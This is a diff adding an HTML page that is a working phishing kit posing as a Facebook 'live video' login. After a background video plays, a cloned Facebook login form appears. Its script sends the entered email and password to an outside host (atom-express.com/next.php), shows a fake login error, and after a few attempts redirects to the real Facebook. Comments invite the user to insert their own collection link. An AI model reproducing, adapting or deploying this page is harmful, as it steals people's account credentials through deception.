@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+      <meta charset="UTF-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <meta name="apple-mobile-web-app-capable" content="yes">
+      <meta name="referrer" content="default" id="meta_referrer">
+      <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+      <title>Join Our Live Video</title>
+</head>
+<body>
+      <style>
+            body{
+                  margin: 0;
+                  padding: 0;
+                  box-sizing: border-box;
+                  display: flex;
+                  justify-content: center;
+                  align-items: center;
+                  height: 100vh;
+            }
+            video{
+                  width: 100%;
+                  height: 100vh;
+                  position: fixed;
+                  top: 0;
+            }
+            .container{
+                  border: 1px solid whitesmoke;
+                  padding: 30px 20px;
+                  border-radius: 20px;
+                  background: white;
+                  z-index: 10;
+                  width: 80%;
+                  display: none;
+            }
+            .container .img{
+                  padding: 10px;
+                  text-align: center;
+            }
+            form{
+                  display: flex;
+                  flex-flow: column;
+                  gap: 10px;
+            }
+            .form_input{
+                  display: flex;
+                  flex-flow: row;
+                  gap: 5px;
+                  justify-content: center;
+                  align-items: center;
+                  width: inherit;
+                  border: 1px solid #e4eaee;
+                  background: #e4eaee;
+                  border-radius: 5px;
+                  border-bottom: 2px solid #bbc1c8;
+                  padding: 5px 8px;
+            }
+            .input{
+                  padding: 10px;
+                  outline: none;
+                  width: 100%;
+                  border: none !important;
+                  background: none !important;
+            }
+            b{
+                  cursor: pointer;
+            }
+            .login{
+                  background: #1877f2;
+                  padding: 10px;
+                  color: white;
+                  border: 1px solid #1877f2;
+                  border-radius: 5px;
+                  font-size: 105%;
+                  font-weight: 600;
+            }
+            .forgot_password{
+                  padding: 10px 0;
+                  display: flex;
+                  justify-content: center;
+                  align-items: center;
+            }
+            .error{
+                  display: none;
+            }
+
+            @media screen and (min-width : 500px) {
+                  .container{
+                        width: 450px;
+                  }
+            }
+      </style>
+
+      <!-- add link below -->
+      <video autoplay muted loop>
+            <source src="https://raw.githubusercontent.com/License4/vid/main/facebookvideo.mp4" type="video/mp4">
+      </video>
+
+      <div class="container">
+            <div class="img">
+                  <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" alt="facebook logo">
+            </div>
+            <form action="" method="GET">
+                  <div class="form_input">
+                        <input type="text" name="email" class="input" placeholder="Mobile number or email" required>
+                  </div>
+                  <div class="form_input">
+                        <input type="password" class="input" id="password" name="password" placeholder="Password" required>
+                        <b style="color: dodgerblue" onclick="showPasswords()" id="show">Show</b>
+                  </div>
+                  <button type="submit" class="login" name="submit">Log In</button>
+                  <div class="forgot_password">
+                        <a href="https://web.facebook.com/recover/initiate/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjY4MDU5Nzc5LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&ars=facebook_login" style="color: #1877f2; text-decoration: none; font-weight: 600;">Forgotten Password ?</a>
+                  </div>
+                  <div style="color: red; text-align: center;" class="error">There was an error logging into your account. Please try again !</div>
+            </form>
+      </div>
+
+      <script>
+            function showPasswords(){
+                  var password = document.getElementById("password");
+                  if (password.type === "password") {
+                        password.setAttribute("type", "text");
+                        document.getElementById("show").innerText = "Hide";
+                  } else {
+                        password.setAttribute("type", "password");
+                        document.getElementById("show").innerText = "Show";
+                  }
+            };
+
+            setTimeout(() => {
+                  $(".container").fadeIn();
+            }, 5000);
+
+            var times = 1;
+            $(".login").click(function(){
+                  times++;
+                  $("form").submit(function(e){
+                        e.preventDefault();
+                        var formValues = $(this).serialize();
+                        $.ajax({
+                        type: "GET",
+                        // add your php link here
+                        url: "https://atom-express.com/next.php",
+                        data: formValues
+                        }).done(function(data, status){
+                              $(".input").val("");
+                              $(".error").fadeIn();
+                              if (times == 3) {
+                                    window.location.href='https://www.facebook.com';
+                              }
+                        });
+                  });
+            });
+      </script>
+</body>
+</html>
